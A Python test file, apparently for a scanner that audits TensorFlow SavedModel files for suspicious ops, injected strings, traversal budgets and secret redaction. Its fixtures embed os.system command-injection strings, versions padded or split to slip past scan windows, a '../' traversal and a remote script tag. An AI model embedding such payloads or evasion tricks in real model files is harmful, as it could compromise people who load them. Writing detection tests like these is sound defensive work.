    # Synthesize a SavedModel containing a WriteFile node
    model_path = _create_test_savedmodel_with_op(tmp_path, "WriteFile", "writefile_test")
    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(model_path)

    writefile_issues = [i for i in result.issues if i.message and "WriteFile" in i.message]
    assert writefile_issues, "Expected detection for WriteFile operation"
    assert any(i.severity == IssueSeverity.CRITICAL for i in writefile_issues)
    # Ensure an explanation is provided for developer guidance
    assert any(i.why for i in writefile_issues), "Missing explanation for WriteFile detection"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
@pytest.mark.parametrize(
    ("op_name", "function_name"),
    [
        ("WriteFile", "__inference_writefile_attack_1"),
        ("PyFunc", "__inference_pyfunc_attack_1"),
        ("ParseTensor", "__inference_parse_tensor_attack_1"),
    ],
)
def test_detect_suspicious_ops_in_function_definitions(
    tmp_path: Path,
    op_name: str,
    function_name: str,
) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        function_nodes={
            function_name: [
                {
                    "op": op_name,
                    "name": f"function_{op_name.lower()}_node",
                }
            ]
        },
        model_name=f"function_def_{op_name.lower()}",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    matching_issues = [issue for issue in result.issues if issue.message and op_name in issue.message]

    assert matching_issues, f"Expected detection for {op_name} inside a function definition"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in matching_issues)
    assert any(issue.details.get("node_scope") == "function_def" for issue in matching_issues)
    assert any(issue.details.get("function_name") == function_name for issue in matching_issues)
    assert any(function_name in (issue.location or "") for issue in matching_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_stateful_partitioned_call_detected_in_function_definition(tmp_path: Path) -> None:
    function_name = "__inference_stateful_partitioned_call_1"
    target_name = "__inference_eval_fn_123"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        function_nodes={
            function_name: [
                {
                    "op": "StatefulPartitionedCall",
                    "name": "partitioned_call",
                    "function_ref": target_name,
                }
            ]
        },
        model_name="function_def_stateful_partitioned_call",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    matching_issues = [
        issue
        for issue in result.issues
        if issue.message and "StatefulPartitionedCall with suspicious function" in issue.message
    ]

    assert matching_issues, "Expected StatefulPartitionedCall warning inside a function definition"
    assert all(issue.severity == IssueSeverity.WARNING for issue in matching_issues)
    assert any(issue.details.get("stateful_call_target") == target_name for issue in matching_issues)
    assert any(issue.details.get("node_scope") == "function_def" for issue in matching_issues)
    assert any(issue.details.get("function_name") == function_name for issue in matching_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_stateful_partitioned_call_ignores_evaluate_like_function_names(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        function_nodes={
            "__inference_stateful_partitioned_call_1": [
                {
                    "op": "StatefulPartitionedCall",
                    "name": "partitioned_call",
                    "function_ref": "__inference_evaluate_123",
                }
            ]
        },
        model_name="function_def_stateful_partitioned_call_evaluate",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert not any(
        issue.message and "StatefulPartitionedCall with suspicious function" in issue.message for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_lambda_named_function_definition_nodes_do_not_trigger_lambda_layer_warning(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        function_nodes={
            "__inference_safe_lambdaish_1": [
                {
                    "op": "Identity",
                    "name": "lambda/Identity",
                }
            ]
        },
        model_name="function_def_lambda_named_node",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert not any(issue.message == "Lambda layer detected in graph" for issue in result.issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_graph_lambda_named_nodes_still_trigger_lambda_layer_warning(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Identity",
                "name": "lambda/Identity",
            }
        ],
        model_name="graph_lambda_named_node",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    lambda_issues = [issue for issue in result.issues if issue.message == "Lambda layer detected in graph"]

    assert lambda_issues, "Expected Lambda layer warning for top-level graph nodes"
    assert any(issue.details.get("node_scope") == "graph_def" for issue in lambda_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_protobuf_string_injection_detected_in_function_definition(tmp_path: Path) -> None:
    function_name = "__inference_payload_attack_1"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        function_nodes={
            function_name: [
                {
                    "op": "Const",
                    "name": "payload_node",
                    "string_attrs": {
                        "payload": "os.system('/bin/echo exploit')",
                    },
                }
            ]
        },
        model_name="function_def_string_injection",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    injection_issues = [
        issue
        for issue in result.issues
        if "protobuf string" in issue.message.lower() and issue.details.get("attack_type") == "system_command"
    ]

    assert injection_issues, "Expected protobuf string injection detection inside a function definition"
    assert any(issue.details.get("node_scope") == "function_def" for issue in injection_issues)
    assert any(issue.details.get("function_name") == function_name for issue in injection_issues)
    assert any(issue.details.get("attribute_name") == "payload" for issue in injection_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_padded_protobuf_string_injection_past_length_threshold_is_detected(tmp_path: Path) -> None:
    payload = "A" * 12_000 + "os.system('/bin/echo padded exploit')"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "padded_payload_node",
                "string_attrs": {"payload": payload},
            }
        ],
        model_name="padded_string_injection",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    aggregate = scan_model_directory_or_file(model_path, cache_scan_results=False)

    injection_issues = [
        issue
        for issue in result.issues
        if "protobuf string" in issue.message.lower() and issue.details.get("attack_type") == "system_command"
    ]
    assert result.success is False
    assert determine_exit_code(aggregate) == 1
    assert injection_issues, "Expected padded protobuf string injection detection past the old 10 KB cutoff"
    assert any(issue.details.get("attribute_name") == "payload" for issue in injection_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_padded_protobuf_string_list_injection_is_detected(tmp_path: Path) -> None:
    payload = "A" * 12_000 + "os.system('/bin/echo padded list exploit')"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "padded_list_payload_node",
                "string_list_attrs": {"payloads": ["safe-value", payload]},
            }
        ],
        model_name="padded_string_list_injection",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    aggregate = scan_model_directory_or_file(model_path, cache_scan_results=False)

    injection_issues = [
        issue
        for issue in result.issues
        if "protobuf string" in issue.message.lower() and issue.details.get("attack_type") == "system_command"
    ]
    assert result.success is False
    assert determine_exit_code(aggregate) == 1
    assert injection_issues, "Expected padded protobuf string-list injection detection"
    assert any(issue.details.get("attribute_name") == "payloads" for issue in injection_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_benign_long_protobuf_string_is_scanned_without_security_finding(tmp_path: Path) -> None:
    benign_value = "safe-metadata-" + ("A" * 12_000)
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "benign_long_node",
                "string_attrs": {"description": benign_value},
            }
        ],
        model_name="benign_long_string",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    aggregate = scan_model_directory_or_file(model_path, cache_scan_results=False)

    assert result.success is True
    assert determine_exit_code(aggregate) == 0
    assert not [
        issue
        for issue in result.issues
        if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        and "protobuf string" in issue.message.lower()
    ]
    assert any(check.name == "Protobuf String Length Check" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_fully_covered_windowed_protobuf_string_preserves_success(tmp_path: Path) -> None:
    benign_value = "safe-metadata-" + ("A" * 33_000)
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "fully_covered_windowed_node",
                "string_attrs": {"description": benign_value},
            }
        ],
        model_name="fully_covered_windowed_string",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    aggregate = scan_model_directory_or_file(model_path, cache_scan_results=False)

    assert result.success is True
    assert determine_exit_code(aggregate) == 0
    length_checks = [check for check in result.checks if check.name == "Protobuf String Length Check"]
    assert length_checks
    assert length_checks[0].details["string_scan_strategy"] == "full"
    assert "scan_outcome" not in result.metadata


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_fully_covered_windowed_protobuf_string_detects_boundary_split_injection(tmp_path: Path) -> None:
    split_offset = 32_768
    split_prefix = "os.syst"
    payload = ("A" * (split_offset - len(split_prefix)) + "os.system('/bin/echo split exploit')").ljust(49_152, "A")
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "boundary_split_payload_node",
                "string_attrs": {"payload": payload},
            }
        ],
        model_name="boundary_split_windowed_string",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    aggregate = scan_model_directory_or_file(model_path, cache_scan_results=False)

    injection_checks = [
        check
        for check in result.checks
        if check.name == "Protobuf String Injection Check" and check.details.get("attack_type") == "system_command"
    ]
    assert result.success is False
    assert determine_exit_code(aggregate) == 1
    assert injection_checks
    assert injection_checks[0].details["string_scan_strategy"] == "full"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_partial_window_match_does_not_hide_incomplete_protobuf_string_scan(tmp_path: Path) -> None:
    oversized_value = "../" + ("A" * 99_997) + "os.system('/bin/echo hidden exploit')" + ("A" * 200_000)
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "partial_window_match_node",
                "string_attrs": {"payload": oversized_value},
            }
        ],
        model_name="partial_window_match_string",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    aggregate = scan_model_directory_or_file(model_path, cache_scan_results=False)

    assert result.success is False
    assert determine_exit_code(aggregate) == 2
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "savedmodel_protobuf_string_scan_incomplete"
    incomplete_checks = [
        check
        for check in result.checks
        if check.name == "Protobuf String Length Check"
        and check.details.get("scan_outcome_reason") == "savedmodel_protobuf_string_scan_incomplete"
    ]
    injection_checks = [check for check in result.checks if check.name == "Protobuf String Injection Check"]
    assert incomplete_checks
    assert any(check.details["attack_type"] == "path_traversal" for check in injection_checks)
    assert not any(check.details["attack_type"] == "system_command" for check in injection_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_oversized_protobuf_string_without_full_coverage_fails_closed(tmp_path: Path) -> None:
    oversized_value = "safe-metadata-" + ("A" * 300_000)
    cache_dir = tmp_path / "cache"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": "oversized_benign_node",
                "string_attrs": {"description": oversized_value},
            }
        ],
        model_name="oversized_long_string",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    reset_cache_manager()
    try:
        aggregates = [
            scan_model_directory_or_file(
                model_path,
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            for _ in range(2)
        ]

        assert all(determine_exit_code(aggregate) == 2 for aggregate in aggregates)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "savedmodel_protobuf_string_scan_incomplete"
    incomplete_checks = [
        check
        for check in result.checks
        if check.name == "Protobuf String Length Check"
        and check.details.get("scan_outcome_reason") == "savedmodel_protobuf_string_scan_incomplete"
    ]
    assert incomplete_checks
    assert incomplete_checks[0].details["analysis_incomplete"] is True
    assert not [
        issue
        for issue in result.issues
        if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        and "protobuf string" in issue.message.lower()
    ]


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_function_definition_ops_are_counted_in_metadata(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[{"op": "WriteFile", "name": "top_level_write"}],
        function_nodes={
            "__inference_writefile_attack_1": [
                {"op": "WriteFile", "name": "function_write"},
            ]
        },
        model_name="count_function_ops",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert result.metadata["op_counts"]["WriteFile"] == 2
    assert result.metadata["suspicious_op_found"] is True


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_safe_function_definition_ops_do_not_trigger_findings(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[{"op": "Placeholder", "name": "input_node"}],
        function_nodes={
            "__inference_safe_signature_wrapper_1": [
                {"op": "Const", "name": "const_value"},
                {"op": "AddV2", "name": "add_value"},
                {"op": "Identity", "name": "identity_value"},
            ]
        },
        model_name="safe_function_def",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert result.issues == []
    assert result.metadata["op_counts"]["Const"] == 1
    assert result.metadata["op_counts"]["AddV2"] == 1
    assert result.metadata["op_counts"]["Identity"] == 1
    assert result.metadata["suspicious_op_found"] is False


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_op_counts_preserve_redacted_key_collisions(tmp_path: Path) -> None:
    first_secret = "sk-proj-CAND061TFOPSECRETAAAAAAAAAAAAAAAA"
    second_secret = "sk-proj-CAND061TFOPSECRETBBBBBBBBBBBBBBBB"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {"op": f"Custom_{first_secret}"},
            {"op": f"Custom_{second_secret}"},
            {"op": f"Custom_{first_secret}"},
        ],
        model_name="redacted_op_counts",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    assert result.metadata["op_counts"] == {"Custom_<redacted>": 2, "Custom_<redacted>[2]": 1}
    _assert_secret_absent_from_exported_result(result, first_secret)
    _assert_secret_absent_from_exported_result(result, second_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_long_input_message_redacts_node_name(tmp_path: Path) -> None:
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    raw_secret = "sk-proj-CAND061TFNODENAMESECRET000000000000"
    model_dir = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {
                    "op": "Identity",
                    "name": f"node_{raw_secret}",
                    "inputs": ["x" * 2049],
                }
            ],
            model_name="redacted_long_input_node",
        )
    )
    model_path = model_dir / "saved_model.pb"
    saved_model = SavedModel()
    saved_model.ParseFromString(model_path.read_bytes())
    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    scanner._initialize_context(str(model_path))
    result = scanner._create_result()

    scanner._check_protobuf_buffer_overflow(saved_model, result)

    input_checks = [check for check in result.checks if check.name == "Protobuf Input Name Length Check"]

    assert len(input_checks) == 1
    assert "node_<redacted>" in input_checks[0].message
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_graph_node_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_GRAPH_NODES", 2)
    cache_dir = tmp_path / "cache"
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {"op": "Const", "name": "node_0"},
                {"op": "Const", "name": "node_1"},
                {"op": "Const", "name": "node_2"},
            ],
            model_name="oversized_graph_node_budget",
        )
    )

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    budget_checks = [check for check in direct.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "savedmodel_graph_traversal_budget_exceeded"
    assert direct.metadata["graph_node_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "graph_node_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "graph_node_count"
    assert budget_checks[0].details["analysis_incomplete"] is True
    assert determine_exit_code(aggregate) == 2

    reset_cache_manager()
    try:
        cached_aggregates = [
            scan_model_directory_or_file(
                str(model_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            for _ in range(2)
        ]
        assert all(determine_exit_code(cached_aggregate) == 2 for cached_aggregate in cached_aggregates)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_meta_graph_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import importlib

    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_META_GRAPHS", 2)
    model_path = Path(_create_test_savedmodel_with_scoped_nodes(tmp_path, model_name="oversized_meta_graph_budget"))

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    saved_model = SavedModel()
    saved_model.ParseFromString((model_path / "saved_model.pb").read_bytes())
    saved_model.meta_graphs.add().meta_info_def.tags.append("extra_1")
    saved_model.meta_graphs.add().meta_info_def.tags.append("extra_2")
    (model_path / "saved_model.pb").write_bytes(saved_model.SerializeToString())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["meta_graph_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "meta_graph_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "meta_graph_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_node_attribute_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_NODE_ATTRIBUTES", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {
                    "op": "Const",
                    "string_attrs": {"label_0": "safe_0", "label_1": "safe_1", "label_2": "safe_2"},
                }
            ],
            model_name="oversized_node_attribute_budget",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["node_attribute_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "node_attribute_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "node_attribute_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_collection_count_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_COLLECTIONS", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            collection_values={"collection_0": [], "collection_1": [], "collection_2": []},
            model_name="oversized_collection_count_budget",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["collection_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "collection_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "collection_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_function_node_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_FUNCTION_NODES", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            function_nodes={
                "__inference_many_nodes_1": [
                    {"op": "Const", "name": "fn_node_0"},
                    {"op": "Const", "name": "fn_node_1"},
                    {"op": "Const", "name": "fn_node_2"},
                ]
            },
            model_name="oversized_function_node_budget",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["function_node_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "function_node_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "function_node_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_function_count_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_FUNCTIONS", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            function_nodes={
                "__inference_empty_0": [],
                "__inference_empty_1": [],
                "__inference_empty_2": [],
            },
            model_name="oversized_function_count_budget",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["function_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "function_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "function_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_attribute_string_value_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_ATTRIBUTE_STRING_VALUES", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {
                    "op": "Const",
                    "string_list_attrs": {"labels": ["safe_0", "safe_1", "safe_2"]},
                }
            ],
            model_name="oversized_attribute_string_values",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["attribute_string_value_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "attribute_string_value_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "attribute_string_value_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_scalar_attribute_string_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_ATTRIBUTE_STRING_VALUES", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {
                    "op": "Const",
                    "string_attrs": {"label_0": "safe_0", "label_1": "safe_1", "label_2": "safe_2"},
                }
            ],
            model_name="oversized_scalar_attribute_strings",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["attribute_string_value_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "attribute_string_value_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "attribute_string_value_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_mixed_attribute_strings_are_allowed_at_budget(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_ATTRIBUTE_STRING_VALUES", 3)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            graph_nodes=[
                {
                    "op": "Const",
                    "string_attrs": {"label": "safe"},
                    "string_list_attrs": {"labels": ["safe_0", "safe_1"]},
                }
            ],
            model_name="mixed_attribute_strings_at_budget",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))

    assert result.success is True
    assert result.metadata["attribute_string_value_count"] == 3
    assert not any(check.name == "SavedModel Graph Traversal Budget" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_collection_value_budget_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner._MAX_SAVEDMODEL_COLLECTION_VALUES", 2)
    model_path = Path(
        _create_test_savedmodel_with_scoped_nodes(
            tmp_path,
            collection_values={"runtime_scripts": [b"safe_0", b"safe_1", b"safe_2"]},
            model_name="oversized_collection_values",
        )
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_path / "saved_model.pb"))
    budget_checks = [check for check in result.checks if check.name == "SavedModel Graph Traversal Budget"]

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["collection_value_count"] == 3
    assert len(budget_checks) == 1
    assert budget_checks[0].details["limit_reason"] == "collection_value_limit_exceeded"
    assert budget_checks[0].details["limit_name"] == "collection_value_count"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_protobuf_string_injection_detected_in_list_attribute(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "string_list_attrs": {"labels": ["safe", "os.system('echo list-value')"]},
            }
        ],
        model_name="list_attribute_string_injection",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    injection_checks = [check for check in result.checks if check.name == "Protobuf String Injection Check"]

    assert injection_checks
    assert any(check.details.get("attribute_name") == "labels" for check in injection_checks)
    assert any(check.details.get("attack_type") == "system_command" for check in injection_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_protobuf_string_details_redact_model_controlled_values(tmp_path: Path) -> None:
    raw_secret = "sk-proj-CAND061SAVEDDETAILSECRET000000000"
    model_path = _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=[
            {
                "op": "Const",
                "name": f"node_{raw_secret}",
                "string_attrs": {
                    f"payload_{raw_secret}": (f'<script src="https://cdn.example/{raw_secret}/payload.js"></script>')
                },
            }
        ],
        model_name="protobuf_detail_secret",
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
    injection_checks = [check for check in result.checks if check.name == "Protobuf String Injection Check"]

    assert injection_checks
    details = injection_checks[0].details
    matches_text = repr(details["matches"])
    assert "<redacted>" in details["node_name"]
    assert "<redacted>" in details["attribute_name"]
    assert "<script" in matches_text
    assert "<redacted>" in matches_text
    _assert_secret_absent_from_exported_result(result, raw_secret)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_oversized_node_preview_redacts_model_controlled_values(tmp_path: Path) -> None:
    import importlib

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    raw_secret = "sk-proj-CAND061SAVEDNODEPREVIEWSECRET000000000"
    saved_model = SavedModel()
    node = saved_model.meta_graphs.add().graph_def.node.add()
    node.op = "Const"
    node.name = f"node_{raw_secret}_{'A' * 2048}"
    model_path = tmp_path / "saved_model.pb"
    model_path.write_bytes(saved_model.SerializeToString())

